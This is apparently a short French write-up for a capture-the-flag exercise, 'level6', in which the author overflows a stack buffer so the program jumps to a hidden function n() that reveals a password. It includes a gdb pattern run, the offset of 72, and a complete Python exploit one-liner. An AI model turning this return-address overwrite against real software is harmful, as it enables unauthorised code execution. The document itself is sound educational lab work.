# level6

# en desassemblant le code on remarque que la fonction m() est appeler mais elle ne sert a rien, nous on voudrait qu'elle appelle la fonction n() pour récupérer le pass

# pour cela nous allons fare une attaque par buffer overflow en faisant en sorte d'avoir l'adresse de n() en adresse de retour (https://sancy.iut-clermont.uca.fr/~lafourcade/2018PreZSecu/Buffer%20Overflow.pdf)

(https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)

(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()

0x41346341 -> offset 72

# info functions nous donne l'adresse de n() -> 0x08048454

./level6 $(python -c 'print "\x90" * 72 + "\x54\x84\x04\x08"')